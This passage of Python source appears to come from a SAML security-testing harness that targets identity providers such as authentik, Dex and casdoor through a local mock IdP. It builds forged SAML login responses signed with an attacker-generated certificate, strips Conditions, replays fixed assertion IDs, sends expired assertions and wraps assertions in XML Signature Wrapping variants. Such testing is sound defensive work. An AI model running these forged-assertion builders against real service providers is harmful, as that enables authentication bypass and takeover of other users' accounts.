            client_id = resolved_params.get("client_id", _defaults.get("client_id", "valence-test-client"))
            redirect_uri = resolved_params.get("redirect_uri", _defaults.get("redirect_uri", "http://localhost:9090/callback"))
            connector_id = resolved_params.get("saml_connector_id", _meta.get("saml_connector_id", "test-saml"))
            idp_alias = resolved_params.get("idp_alias", _meta.get("saml_connector_id", connector_id))
            state = f"valence-saml-{id(self)}"

            auth_url_template = _meta.get("saml_auth_url_template")
            if auth_url_template:
                auth_path = auth_url_template.format(
                    realm=resolved_params.get("realm", "valence-test"),
                    client_id=client_id,
                    redirect_uri=redirect_uri,
                    idp_alias=idp_alias,
                )
                auth_url = f"{self.base_url}{auth_path}"
                auth_params = {}  # params already in URL
            elif self.profile and self.profile.name == "authentik":
                _slug = resolved_params.get("source_slug",
                         resolved_params.get("saml_source_slug",
                         self.captures.get("saml_source_slug", "saml")))
                auth_url = f"{self.base_url}/source/saml/{_slug}/"
                auth_params = {}
                # Auto-create SAML source if it doesn't exist (Category B fix)
                _pre = self.session.get(auth_url, allow_redirects=False)
                if _pre.status_code == 404:
                    _ak_cache = self._authentik_discovery_cache()
                    _admin_h = {}
                    _ah = self.profile.admin_auth.get("header", "Authorization")
                    _av = self.profile.admin_auth.get("value", "")
                    if "{admin_token}" in _av:
                        _av = self._resolve_admin_token(_av)
                    _admin_h[_ah] = _av
                    _admin_h["Content-Type"] = "application/json"
                    import json as _jj
                    _auto_body = {
                            "name": _slug, "slug": _slug,
                            "authentication_flow": _ak_cache.get("source_authentication_flow", ""),
                            "enrollment_flow": _ak_cache.get("source_enrollment_flow", ""),
                            "sso_url": "http://mock-idp:9090/saml/sso",
                            "issuer": "http://mock-idp:9090",
                            "allow_idp_initiated": True,
                            "signing_kp": _ak_cache.get("signing_key", ""),
                    }
                    _pre_auth2 = _ak_cache.get("source_pre_authentication_flow", "")
                    if _pre_auth2:
                        _auto_body["pre_authentication_flow"] = _pre_auth2
                    _cr = self.session.post(
                        f"{self.base_url}/api/v3/sources/saml/",
                        headers=_admin_h,
                        json=_auto_body, timeout=10)
                    if _cr.ok:
                        logger.info(f"    AUTHENTIK: auto-created SAML source '{_slug}' (Category B fix)")
                    else:
                        logger.warning(f"    AUTHENTIK: failed to auto-create SAML source: {_cr.text[:100]}")
                logger.info(f"    SAML-INIT(authentik): {auth_url}")
            elif "/dex/" in endpoint.path or "/dex" in self.base_url:
                auth_url = f"{self.base_url}/auth"
                auth_params = {
                    "client_id": client_id,
                    "redirect_uri": redirect_uri,
                    "response_type": "code",
                    "scope": "openid",
                    "connector_id": connector_id,
                    "state": state,
                }
            else:
                auth_url = f"{self.base_url}{endpoint.path.rsplit('/', 1)[0]}/auth"
                auth_params = {
                    "client_id": client_id,
                    "redirect_uri": redirect_uri,
                    "response_type": "code",
                    "scope": "openid",
                    "connector_id": connector_id,
                    "state": state,
                }

            # Step 1: Initiate the SAML flow (don't follow redirects)
            resp = self.session.get(auth_url, params=auth_params, allow_redirects=False)
            if resp.status_code not in (302, 303, 307):
                logger.warning(f"    SAML-INIT: expected redirect, got {resp.status_code}")
                return None, None

            # Step 2: Follow redirects until we find a SAMLRequest parameter
            max_hops = 5
            for _hop in range(max_hops):
                location = resp.headers.get("Location", "")
                if not location:
                    break
                if not location.startswith("http"):
                    location = urljoin(f"{self.base_url}/", location)

                parsed = urlparse(location)
                qs = parse_qs(parsed.query)

                if "SAMLRequest" in qs:
                    saml_request_b64 = qs["SAMLRequest"][0]
                    relay_state = qs.get("RelayState", [None])[0]
                    authn_id = self._parse_saml_request_id(saml_request_b64)
                    if authn_id:
                        logger.info(f"    SAML-INIT: extracted AuthnRequest ID={authn_id} (redirect binding, hop {_hop + 1})")
                        return authn_id, relay_state

                # Follow the redirect
                resp = self.session.get(location, allow_redirects=False)
                if resp.status_code not in (302, 303, 307):
                    # Check if this is an HTML page with POST binding (embedded SAMLRequest in form)
                    if resp.status_code == 200 and "SAMLRequest" in resp.text:
                        import re
                        match = re.search(r'name="SAMLRequest"\s+value="([^"]+)"', resp.text)
                        relay_match = re.search(r'name="RelayState"\s+value="([^"]*)"', resp.text)
                        if match:
                            saml_request_b64 = match.group(1)
                            relay_state = relay_match.group(1) if relay_match else None
                            authn_id = self._parse_saml_request_id(saml_request_b64)
                            if authn_id:
                                logger.info(f"    SAML-INIT: extracted AuthnRequest ID={authn_id} (POST binding, hop {_hop + 1})")
                                return authn_id, relay_state
                    break

            logger.warning("    SAML-INIT: could not find SAMLRequest in redirect chain")
            return None, None

        except Exception as e:
            logger.warning(f"    SAML-INIT: error initiating SAML flow: {e}")
            return None, None

    @staticmethod
    def _parse_saml_request_id(saml_request_b64: str) -> Optional[str]:
        """Extract the AuthnRequest ID from a base64-encoded SAMLRequest."""
        import base64
        import zlib
        from lxml import etree

        try:
            raw = base64.b64decode(saml_request_b64)
            try:
                xml_bytes = zlib.decompress(raw, -15)
            except zlib.error:
                xml_bytes = raw
            root = etree.fromstring(xml_bytes)
            return root.get("ID")
        except Exception:
            return None

    def _build_saml_login_response(self, event: Event, params: dict, in_response_to: str = None) -> str:
        """Build a forged SAMLResponse for SAML login events.

        Generates a SAML response signed with an attacker-generated cert.
        Uses saml2p:/saml2: namespace prefixes for gosaml2 compatibility.
        Tests I1 (trust anchor substitution) and I4 (email binding collision).

        If in_response_to is provided, the Response element and SubjectConfirmationData
        will include InResponseTo matching a prior AuthnRequest (required by SPs like Dex).

        If params contains ``saml_mutation`` (e.g. ``i1_xsw_4``), the response
        is built using :class:`SAMLFactory` with the *trusted* IdP key fetched
        from the mock-idp ``/saml/key`` endpoint.  This enables XSW testing
        where the legitimate assertion carries a valid signature.
        """
        # --- SAML mutation path: XSW / replay / engine mutations ---
        saml_mutation = params.get("saml_mutation")
        if saml_mutation and saml_mutation.startswith("i1_xsw_"):
            return self._build_xsw_response(event, params, in_response_to, saml_mutation)

        _saml_ep_meta_check = None
        if self.profile:
            _saml_ep_check = self.profile.get_endpoint("saml", "saml_login")
            _saml_ep_meta_check = getattr(_saml_ep_check, "metadata", {}) or {} if _saml_ep_check else {}
        _has_file_key = _saml_ep_meta_check and _saml_ep_meta_check.get("saml_idp_key_path")
        # Also use trusted key when initiate_saml_flow is enabled (SP requires valid signature)
        # and the caller hasn't explicitly requested attacker key
        _has_sp_flow = _saml_ep_meta_check and _saml_ep_meta_check.get("initiate_saml_flow")
        if (_has_file_key or _has_sp_flow) and not params.get("use_attacker_key"):
            trusted_key, trusted_cert = self._fetch_trusted_idp_key()
            if trusted_key:
                return self._build_saml_response_with_key(
                    event, params, in_response_to, trusted_key, trusted_cert
                )
            # If trusted key not available, fall through to attacker key path below

        # --- Trusted key mode: sign with the IdP's real key (for I2 replay, baseline tests) ---
        if params.get("use_trusted_key"):
            from src.utils.saml_factory import SAMLFactory
            trusted_key, trusted_cert = self._fetch_trusted_idp_key()
            if trusted_key:
                factory = SAMLFactory(signing_key=trusted_key, signing_cert=trusted_cert)
                target = params.get("target_identity", params.get("username", "user@example.com"))
                email = params.get("email", target)
                _saml_ep = self.profile.get_endpoint("saml", "saml_login") if self.profile else None
                _ep_meta = getattr(_saml_ep, "metadata", {}) or {} if _saml_ep else {}
                _acs_path = _ep_meta.get("acs_url") or (_saml_ep.path if _saml_ep else "/api/acs")
                for _pk, _pv in params.items():
                    if isinstance(_pv, str):
                        _acs_path = _acs_path.replace(f"{{{_pk}}}", _pv)
                sp_acs_url = f"{self.base_url}{_acs_path}"
                return factory.create_response(
                    issuer=params.get("idp_entity_id", "http://mock-idp:9090"),
                    destination=sp_acs_url,
                    name_id=target,
                    attributes={"email": email, "name": target},
                    sign_response=True, sign_assertion=True,
                    in_response_to=in_response_to,
                )

        # Use SAMLFactory for compliant XML (attacker key auto-generated).
        if self.profile and self.profile.name == "authentik":
            return self._build_saml_via_factory(
                params, in_response_to, None, None  # None = use attacker key
            )

        import base64
        import uuid
        from datetime import datetime, timedelta, timezone
        from urllib.parse import quote as urlquote
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from lxml import etree
        import signxml

        target_name_id = params.get("target_identity", params.get("username", "admin"))
        email = params.get("email", target_name_id)
        # Derive ACS URL from profile metadata or dedicated ACS endpoint.
        # (Destination/Recipient in the SAMLResponse) vs the login endpoint.
        _saml_ep = self.profile.get_endpoint("saml", "saml_login") if self.profile else None
        _ep_meta = getattr(_saml_ep, 'metadata', {}) or {} if _saml_ep else {}
        # NOT the actual endpoint path (e.g. /callback/test-saml).  Check acs_url
        # metadata first, then environment_defaults.saml_sp_acs_url or redirect_uri
        # for the SP's configured callback.
        _env = getattr(self.profile, 'environment_defaults', {}) or {} if self.profile else {}
        _acs_url_override = (
            _ep_meta.get("acs_url")
            or _env.get("saml_sp_acs_url")
            or (self.profile.get_endpoint("saml", "saml_sp_acs").path
                if self.profile and self.profile.get_endpoint("saml", "saml_sp_acs")
                else None)
        )
        if _acs_url_override:
            _acs_path = _acs_url_override
        else:
            _acs_path = _saml_ep.path if _saml_ep else "/api/acs"
        # Resolve path templates like {realm}, {idp_alias} from params
        for _pk, _pv in params.items():
            if isinstance(_pv, str):
                _acs_path = _acs_path.replace(f"{{{_pk}}}", _pv)
        # If _acs_path is a full URL, use it directly; otherwise prepend base_url
        if _acs_path.startswith("http"):
            sp_acs_url = _acs_path
        else:
            sp_acs_url = f"{self.base_url}{_acs_path}"

        # Derive issuer: prefer captured entityId from IdP creation, then params, then mock-idp
        _default_issuer = (
            self.captures.get("_last_saml_entity_id")
            or "http://mock-idp:9090"
        )
        if self.profile:
            _provider_name = params.get("provider", "")
            if not _provider_name:
                _sl_defaults = getattr(self.profile.get_endpoint("saml", "saml_login"), 'default_params', {}) or {}
                _provider_name = _sl_defaults.get("provider", "")
            # login handler falls back to it when LLM-created providers/apps don't exist.
            if self.profile.name == "casdoor":
                self._ensure_admin_session()
                _providers_to_try = ["provider-saml-test"]
            else:
                _providers_to_try = [_provider_name] if _provider_name else []
            for _pn in _providers_to_try:
                try:
                    _pr = self.session.get(f"{self.base_url}/api/get-provider",
                                           params={"id": f"admin/{_pn}"}, timeout=5)
                    if _pr.ok:
                        _pdata = _pr.json().get("data") or {}
                        _issuer_url = _pdata.get("issuerUrl")
                        if _issuer_url:
                            _default_issuer = _issuer_url
                            break
                except Exception:
                    pass
        if self.profile and self.profile.name == "casdoor" and _default_issuer != "http://mock-idp:9090":
            issuer = _default_issuer
        else:
            issuer = params.get("idp_entity_id", _default_issuer)

        # Generate attacker keypair
        privkey = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        now = datetime.now(timezone.utc)
        cert = (
            x509.CertificateBuilder()
            .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "attacker-idp")]))
            .issuer_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "attacker-idp")]))
            .public_key(privkey.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - timedelta(days=1))
            .not_valid_after(now + timedelta(days=365))
            .sign(privkey, hashes.SHA256())
        )
        cert_pem = cert.public_bytes(serialization.Encoding.PEM)
        key_pem = privkey.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.PKCS8,
            serialization.NoEncryption(),
        )

        t = now.strftime("%Y-%m-%dT%H:%M:%SZ")
        nb = (now - timedelta(minutes=5)).strftime("%Y-%m-%dT%H:%M:%SZ")
        na = (now + timedelta(minutes=30)).strftime("%Y-%m-%dT%H:%M:%SZ")

        # Build XML with saml2p:/saml2: prefixes (required by gosaml2)
        _irt_resp = f' InResponseTo="{in_response_to}"' if in_response_to else ''
        _irt_scd = f' InResponseTo="{in_response_to}"' if in_response_to else ''

        _sp_audience = params.get("sp_entity_id") or (
            sp_acs_url.split("/broker/")[0] if "/broker/" in sp_acs_url else sp_acs_url
        )

        _remove_conditions = params.get("remove_conditions", False)
        _include_onetimeuse = params.get("include_onetimeuse", False)
        if _remove_conditions:
            _conditions_xml = ''
            logger.info("    SAML: remove_conditions=True — omitting Conditions element")
        else:
            _onetimeuse = '<saml2:OneTimeUse/>' if _include_onetimeuse else ''
            _conditions_xml = (
                f'<saml2:Conditions NotBefore="{nb}" NotOnOrAfter="{na}">'
                f'<saml2:AudienceRestriction><saml2:Audience>{_sp_audience}</saml2:Audience></saml2:AudienceRestriction>'
                f'{_onetimeuse}'
                f'</saml2:Conditions>'
            )
            if _include_onetimeuse:
                logger.info("    SAML: include_onetimeuse=True — added OneTimeUse condition")

        # Support fixed assertion ID for replay testing.
        # When fixed_assertion_id is set, all saml_login events sharing
        # the same ID will produce assertions with the same Assertion/@ID,
        # enabling OneTimeUse and assertion-ID-replay detection.
        _fixed_aid = params.get("fixed_assertion_id")
        _assertion_id = _fixed_aid if _fixed_aid else f"_a{uuid.uuid4().hex}"
        if _fixed_aid:
            logger.info(f"    SAML: using fixed_assertion_id={_fixed_aid} (replay/OneTimeUse test)")

        xml = (
            f'<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"'
            f' xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion"'
            f' ID="_r{uuid.uuid4().hex}" Version="2.0" IssueInstant="{t}" Destination="{sp_acs_url}"{_irt_resp}>'
            f'<saml2:Issuer>{issuer}</saml2:Issuer>'
            f'<saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>'
            f'<saml2:Assertion ID="{_assertion_id}" Version="2.0" IssueInstant="{t}">'
            f'<saml2:Issuer>{issuer}</saml2:Issuer>'
            f'<saml2:Subject>'
            f'<saml2:NameID>{target_name_id}</saml2:NameID>'
            f'<saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">'
            f'<saml2:SubjectConfirmationData NotOnOrAfter="{na}" Recipient="{sp_acs_url}"{_irt_scd}/>'
            f'</saml2:SubjectConfirmation>'
            f'</saml2:Subject>'
            f'{_conditions_xml}'
            f'<saml2:AuthnStatement AuthnInstant="{t}">'
            f'<saml2:AuthnContext><saml2:AuthnContextClassRef>'
            f'urn:oasis:names:tc:SAML:2.0:ac:classes:Password'
            f'</saml2:AuthnContextClassRef></saml2:AuthnContext>'
            f'</saml2:AuthnStatement>'
            f'<saml2:AttributeStatement>'
            f'<saml2:Attribute Name="email"><saml2:AttributeValue>{email}</saml2:AttributeValue></saml2:Attribute>'
            f'<saml2:Attribute Name="username"><saml2:AttributeValue>{target_name_id}</saml2:AttributeValue></saml2:Attribute>'
            f'<saml2:Attribute Name="displayName"><saml2:AttributeValue>{params.get("displayName", target_name_id)}</saml2:AttributeValue></saml2:Attribute>'
            f'<saml2:Attribute Name="groups"><saml2:AttributeValue>{params.get("groups", "users")}</saml2:AttributeValue></saml2:Attribute>'
            f'</saml2:AttributeStatement>'
            f'</saml2:Assertion></saml2p:Response>'
        )

        root = etree.fromstring(xml.encode())
        signer = signxml.XMLSigner(
            method=signxml.methods.enveloped,
            signature_algorithm="rsa-sha256",
            digest_algorithm="sha256",
            c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#",
        )
        # Use empty reference_uri — goxmldsig matches URI="" as top-level ref
        signed = signer.sign(root, key=key_pem, cert=cert_pem)
        saml_b64 = base64.b64encode(etree.tostring(signed, xml_declaration=False)).decode()
        # Return raw base64 — form encoding is handled by requests library.
        # Do NOT URL-encode here as that causes double-encoding in form POST.
        return saml_b64

    def _build_saml_response_with_key(
        self, event: "Event", params: dict, in_response_to: str | None,
        signing_key, signing_cert
    ) -> str:
        """Build a SAMLResponse signed with a specific key (e.g. trusted IdP key from file).

        Supports the ``remove_conditions`` param (omit Conditions element).
        Uses the same XML structure as the attacker-key path but with an externally
        provided signing key, enabling tests where the signature must be valid.
        """
        # Delegate to SAMLFactory which builds compliant XML via lxml etree.
        if self.profile and self.profile.name == "authentik":
            return self._build_saml_via_factory(
                params, in_response_to, signing_key, signing_cert
            )
        import base64
        import uuid
        from datetime import datetime, timedelta, timezone
        from cryptography.hazmat.primitives import serialization
        from lxml import etree
        import signxml

        target_name_id = params.get("target_identity", params.get("username", "admin"))
        email = params.get("email", target_name_id)

        # Derive ACS URL from profile — check acs_url metadata, then
        # environment_defaults.saml_sp_acs_url for the SP's configured callback
        _saml_ep = self.profile.get_endpoint("saml", "saml_login") if self.profile else None
        _ep_meta = getattr(_saml_ep, 'metadata', {}) or {} if _saml_ep else {}
        _env = getattr(self.profile, 'environment_defaults', {}) or {} if self.profile else {}
        _acs_url_override = _ep_meta.get("acs_url") or _env.get("saml_sp_acs_url")
        if _acs_url_override:
            _acs_path = _acs_url_override
        else:
            _acs_path = _saml_ep.path if _saml_ep else "/api/acs"
        for _pk, _pv in params.items():
            if isinstance(_pv, str):
                _acs_path = _acs_path.replace(f"{{{_pk}}}", _pv)
        if _acs_path.startswith("http"):
            sp_acs_url = _acs_path
        else:
            sp_acs_url = f"{self.base_url}{_acs_path}"

        # Derive issuer from params, profile metadata, or default
        _default_issuer = "http://mock-idp:9090"
        if _ep_meta.get("saml_idp_issuer"):
            _default_issuer = _ep_meta["saml_idp_issuer"]
        issuer = params.get("idp_entity_id", _default_issuer)

        _sp_audience = params.get("sp_entity_id") or (
            sp_acs_url.split("/broker/")[0] if "/broker/" in sp_acs_url else sp_acs_url
        )

        # Get PEM bytes from key/cert objects
        key_pem = signing_key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.PKCS8,
            serialization.NoEncryption(),
        )
        cert_pem = signing_cert.public_bytes(serialization.Encoding.PEM)

        now = datetime.now(timezone.utc)
        t = now.strftime("%Y-%m-%dT%H:%M:%SZ")
        nb = (now - timedelta(minutes=5)).strftime("%Y-%m-%dT%H:%M:%SZ")
        na = (now + timedelta(minutes=30)).strftime("%Y-%m-%dT%H:%M:%SZ")

        _irt_resp = f' InResponseTo="{in_response_to}"' if in_response_to else ''
        _irt_scd = f' InResponseTo="{in_response_to}"' if in_response_to else ''

        _remove_conditions = params.get("remove_conditions", False)
        _include_onetimeuse = params.get("include_onetimeuse", False)
        if _remove_conditions:
            _conditions_xml = ''
            logger.info("    SAML: remove_conditions=True — omitting Conditions (trusted key)")
        else:
            _onetimeuse = '<saml2:OneTimeUse/>' if _include_onetimeuse else ''
            _conditions_xml = (
                f'<saml2:Conditions NotBefore="{nb}" NotOnOrAfter="{na}">'
                f'<saml2:AudienceRestriction><saml2:Audience>{_sp_audience}</saml2:Audience></saml2:AudienceRestriction>'
                f'{_onetimeuse}'
                f'</saml2:Conditions>'
            )
            if _include_onetimeuse:
                logger.info("    SAML: include_onetimeuse=True — added OneTimeUse (trusted key)")

        _fixed_aid = params.get("fixed_assertion_id")
        _assertion_id = _fixed_aid if _fixed_aid else f"_a{uuid.uuid4().hex}"
        if _fixed_aid:
            logger.info(f"    SAML: using fixed_assertion_id={_fixed_aid} (trusted key, replay test)")

        xml = (
            f'<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"'
            f' xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion"'
            f' ID="_r{uuid.uuid4().hex}" Version="2.0" IssueInstant="{t}" Destination="{sp_acs_url}"{_irt_resp}>'
            f'<saml2:Issuer>{issuer}</saml2:Issuer>'
            f'<saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>'
            f'<saml2:Assertion ID="{_assertion_id}" Version="2.0" IssueInstant="{t}">'
            f'<saml2:Issuer>{issuer}</saml2:Issuer>'
            f'<saml2:Subject>'
            f'<saml2:NameID>{target_name_id}</saml2:NameID>'
            f'<saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">'
            f'<saml2:SubjectConfirmationData NotOnOrAfter="{na}" Recipient="{sp_acs_url}"{_irt_scd}/>'
            f'</saml2:SubjectConfirmation>'
            f'</saml2:Subject>'
            f'{_conditions_xml}'
            f'<saml2:AuthnStatement AuthnInstant="{t}">'
            f'<saml2:AuthnContext><saml2:AuthnContextClassRef>'
            f'urn:oasis:names:tc:SAML:2.0:ac:classes:Password'
            f'</saml2:AuthnContextClassRef></saml2:AuthnContext>'
            f'</saml2:AuthnStatement>'
            f'<saml2:AttributeStatement>'
            f'<saml2:Attribute Name="email"><saml2:AttributeValue>{email}</saml2:AttributeValue></saml2:Attribute>'
            f'<saml2:Attribute Name="username"><saml2:AttributeValue>{target_name_id}</saml2:AttributeValue></saml2:Attribute>'
            f'<saml2:Attribute Name="displayName"><saml2:AttributeValue>{params.get("displayName", target_name_id)}</saml2:AttributeValue></saml2:Attribute>'
            f'<saml2:Attribute Name="groups"><saml2:AttributeValue>{params.get("groups", "users")}</saml2:AttributeValue></saml2:Attribute>'
            f'</saml2:AttributeStatement>'
            f'</saml2:Assertion></saml2p:Response>'
        )

        root = etree.fromstring(xml.encode())
        signer = signxml.XMLSigner(
            method=signxml.methods.enveloped,
            signature_algorithm="rsa-sha256",
            digest_algorithm="sha256",
            c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#",
        )
        # Sign the Assertion element (not the Response).  goxmldsig validates
        # Response-level signatures first, then falls back to Assertion-level.
        # Response-level signing with signxml produces namespace contexts that
        # goxmldsig's etree-based validator fails to match.  Assertion-level
        SAML2_NS = "urn:oasis:names:tc:SAML:2.0:assertion"
        assertion_el = root.find(f"{{{SAML2_NS}}}Assertion")
        if assertion_el is not None:
            signed_assertion = signer.sign(assertion_el, key=key_pem, cert=cert_pem)
            # Move Signature after Issuer (position 1) for goxmldsig compat
            DS_NS = "{http://www.w3.org/2000/09/xmldsig#}"
            sig_elem = signed_assertion.find(f"{DS_NS}Signature")
            if sig_elem is not None:
                signed_assertion.remove(sig_elem)
                signed_assertion.insert(1, sig_elem)
            # Replace original assertion with signed one
            root.remove(assertion_el)
            root.append(signed_assertion)
        else:
            # Fallback: sign the whole response if no Assertion element found
            root = signer.sign(root, key=key_pem, cert=cert_pem)
        saml_b64 = base64.b64encode(etree.tostring(root, xml_declaration=False)).decode()
        logger.info(f"    SAML: built response with trusted key (remove_conditions={_remove_conditions})")
        return saml_b64

    def _build_saml_via_factory(
        self, params: dict, in_response_to: str | None,
        signing_key, signing_cert,
    ) -> str:
        """Build SAMLResponse using SAMLFactory (saml:/samlp: namespace prefixes).

        Used for platforms like authentik whose SAML parser requires standard
        namespace prefixes.  Other platforms use the raw-XML builder which
        emits saml2:/saml2p: prefixes for gosaml2 compatibility.

        When signing_key/signing_cert are None, generates an attacker keypair.
        """
        from src.utils.saml_factory import SAMLFactory

        if signing_key and signing_cert:
            factory = SAMLFactory(signing_key=signing_key, signing_cert=signing_cert)
        else:
            factory = SAMLFactory()  # generates attacker keypair

        target = params.get("target_identity", params.get("username", "user@example.com"))
        email = params.get("email", target)
        issuer = params.get("idp_entity_id",
                            self.captures.get("_last_saml_entity_id", "http://mock-idp:9090"))

        # Derive ACS URL
        _saml_ep = self.profile.get_endpoint("saml", "saml_login") if self.profile else None
        _acs_path = _saml_ep.path if _saml_ep else "/source/saml/{source_slug}/acs/"
        for _pk, _pv in params.items():
            if isinstance(_pv, str):
                _acs_path = _acs_path.replace(f"{{{_pk}}}", _pv)
        sp_acs_url = f"{self.base_url}{_acs_path}" if not _acs_path.startswith("http") else _acs_path

        _remove_conditions = params.get("remove_conditions", False)
        _include_onetimeuse = params.get("include_onetimeuse", False)
        _fixed_aid = params.get("fixed_assertion_id")
        _wrong_audience = params.get("audience") or params.get("sp_entity_id")

        # Build attributes
        attributes = {"email": email, "username": target,
                      "displayName": params.get("displayName", target)}

        # Handle special params
        not_on_or_after = None
        if _remove_conditions:
            # SAMLFactory always adds Conditions; for remove_conditions we need
            # to post-process the XML to strip the Conditions element
            pass

        from datetime import datetime, timedelta, timezone
        import base64
        from lxml import etree

        # Override assertion ID if fixed
        assertion_id_override = _fixed_aid

        # Check for SAML mutation from the engine (e.g. i2_expired_assertion)
        _saml_mutation = params.get("saml_mutation", "")
        _is_expired = (_saml_mutation == "i2_expired_assertion"
                       or params.get("expired_assertion", False))

        # Create the response — use expired variant if requested (time-bound test)
        if _is_expired:
            b64_resp = factory.create_expired_response(
                issuer=issuer,
                destination=sp_acs_url,
                name_id=target,
                attributes=attributes,
                expired_minutes_ago=60,
            )
            logger.info("    SAML(factory): created EXPIRED assertion (NotOnOrAfter 60min ago)")
        else:
            b64_resp = factory.create_response(
                issuer=issuer,
                destination=sp_acs_url,
                name_id=target,
                attributes=attributes,
                sign_response=False,
                sign_assertion=True,
                in_response_to=in_response_to,
            )

        # Post-process for special params (audience override, conditions removal, etc.)
        if _remove_conditions or _include_onetimeuse or _fixed_aid or _wrong_audience:
            xml_bytes = base64.b64decode(b64_resp)
            root = etree.fromstring(xml_bytes)
            SAML_NS = "urn:oasis:names:tc:SAML:2.0:assertion"
            assertion = root.find(f"{{{SAML_NS}}}Assertion")
            if assertion is not None:
                if _remove_conditions:
                    cond = assertion.find(f"{{{SAML_NS}}}Conditions")
                    if cond is not None:
                        assertion.remove(cond)
                        logger.info("    SAML(factory): removed Conditions element")
                if _include_onetimeuse:
                    cond = assertion.find(f"{{{SAML_NS}}}Conditions")
                    if cond is not None:
                        etree.SubElement(cond, f"{{{SAML_NS}}}OneTimeUse")
                        logger.info("    SAML(factory): added OneTimeUse condition")
                if _fixed_aid:
                    assertion.set("ID", _fixed_aid)
                    logger.info(f"    SAML(factory): set fixed assertion ID={_fixed_aid}")
                if _wrong_audience:
                    cond = assertion.find(f"{{{SAML_NS}}}Conditions")
                    if cond is not None:
                        aud_r = cond.find(f"{{{SAML_NS}}}AudienceRestriction")
                        if aud_r is not None:
                            aud_el = aud_r.find(f"{{{SAML_NS}}}Audience")
                            if aud_el is not None:
                                aud_el.text = str(_wrong_audience)
                                logger.info(f"    SAML(factory): overrode Audience → {_wrong_audience}")
            # Re-sign after modifications (signature is now invalid)
            # For remove_conditions/onetimeuse/fixed_aid, re-sign the assertion
            if assertion is not None and (signing_key and signing_cert):
                DS_NS = "http://www.w3.org/2000/09/xmldsig#"
                old_sig = assertion.find(f"{{{DS_NS}}}Signature")
                if old_sig is not None:
                    assertion.remove(old_sig)
                assertion = factory._sign_element(assertion, assertion.get("ID"))
                root.remove(root.find(f"{{{SAML_NS}}}Assertion"))
                root.append(assertion)
            b64_resp = base64.b64encode(
                etree.tostring(root, xml_declaration=True, encoding="UTF-8")
            ).decode()

        logger.info(f"    SAML(factory): built response for authentik "
                    f"(remove_conditions={_remove_conditions}, onetimeuse={_include_onetimeuse})")
        return b64_resp

    # ------------------------------------------------------------------
    # SAML mutation helpers (XSW, replay, etc.)
    # ------------------------------------------------------------------

    def _build_xsw_response(
        self, event: "Event", params: dict, in_response_to: str | None, mutation: str
    ) -> str:
        """Build a SAMLResponse with an XSW (XML Signature Wrapping) attack.

        Fetches the *trusted* IdP signing key from the mock-idp so the
        legitimate assertion carries a cryptographically valid signature.
        The malicious assertion is unsigned and positioned per the XSW
        variant so a vulnerable SP processes it instead.
        """
        from src.utils.saml_factory import SAMLFactory

        variant = int(mutation.rsplit("_", 1)[-1])
        legitimate_identity = params.get("target_identity", params.get("username", "legitimate-user"))
        malicious_identity = params.get("malicious_identity", params.get("attacker_identity", "attacker@evil.com"))

        # Derive SP ACS URL (same logic as the normal path)
        _saml_ep = self.profile.get_endpoint("saml", "saml_login") if self.profile else None
        _ep_meta = getattr(_saml_ep, "metadata", {}) or {} if _saml_ep else {}
        _acs_path = _ep_meta.get("acs_url") or (
            self.profile.get_endpoint("saml", "saml_sp_acs").path
            if self.profile and self.profile.get_endpoint("saml", "saml_sp_acs")
            else (_saml_ep.path if _saml_ep else "/api/acs")
        )
        # Resolve path templates from params
        for _pk, _pv in params.items():
            if isinstance(_pv, str):
                _acs_path = _acs_path.replace(f"{{{_pk}}}", _pv)
        sp_acs_url = f"{self.base_url}{_acs_path}"
        issuer = params.get("idp_entity_id", "http://mock-idp:9090")

        # Build attributes from params
        email = params.get("email", legitimate_identity)
        attributes = {
            "email": email,
            "name": legitimate_identity,
            "username": legitimate_identity,
        }

        # Get trusted IdP key so the legitimate assertion has a valid signature
        trusted_key, trusted_cert = self._fetch_trusted_idp_key()
        if trusted_key is None:
            logger.warning("    SAML-XSW: could not fetch trusted IdP key — falling back to attacker cert")
            return None  # fall through to normal path

        factory = SAMLFactory(signing_key=trusted_key, signing_cert=trusted_cert)
        xsw_b64 = factory.create_xsw_response(
            variant=variant,
            legitimate_name_id=legitimate_identity,
            malicious_name_id=malicious_identity,
            issuer=issuer,
            destination=sp_acs_url,
            attributes=attributes,
            in_response_to=in_response_to,
        )
        logger.info(
            f"    SAML-XSW: built XSW variant {variant} "
            f"(legit={legitimate_identity}, evil={malicious_identity}, "
            f"dest={sp_acs_url})"
        )
        return xsw_b64

    def _fetch_trusted_idp_key(self):
        """Fetch the mock-idp's SAML signing key for building XSW payloads.

        Returns (RSAPrivateKey, x509.Certificate) or (None, None) on failure.

        Resolution order:
        1. HTTP fetch from mock-idp /saml/key endpoint (live IdP)
        2. Load from file paths in profile metadata (saml_idp_key_path / saml_idp_cert_path)
        """
        from cryptography.hazmat.primitives.serialization import load_pem_private_key
        from cryptography.x509 import load_pem_x509_certificate
        import os

        # Determine mock-idp URL from profile metadata or default
        mock_idp_url = "http://localhost:9090"
        _saml_ep = None
        _meta = {}
        if self.profile:
            _saml_ep = self.profile.get_endpoint("saml", "saml_login")
            _meta = getattr(_saml_ep, "metadata", {}) or {} if _saml_ep else {}
            mock_idp_url = _meta.get("mock_idp_url", mock_idp_url)

        # Strategy 1: fetch from live mock-idp
        try:
            resp = self.session.get(f"{mock_idp_url}/saml/key", timeout=5)
            if resp.ok:
                data = resp.json()
